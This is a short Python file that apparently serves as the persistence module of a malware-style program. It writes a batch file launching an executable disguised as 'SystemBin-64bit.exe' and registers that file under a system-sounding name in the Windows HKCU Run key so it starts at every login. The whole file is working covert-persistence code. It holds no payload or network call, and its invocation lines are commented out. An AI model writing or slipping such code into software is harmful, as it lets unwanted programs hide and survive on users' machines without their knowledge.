import subprocess
import os


class StartUp:
    def run(self):
        self.dir = os.getcwd()
        with open(f"{self.dir}/run.bat", "w") as f:
            f.write("@echo off")
            f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
        self.reg_edit()
            
    def reg_edit(self):
        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/t", "REG_SZ", "/d", f"{self.dir}\\run.bat", "/f"], shell=True)
    
        
#startup = StartUp()
#startup.run()
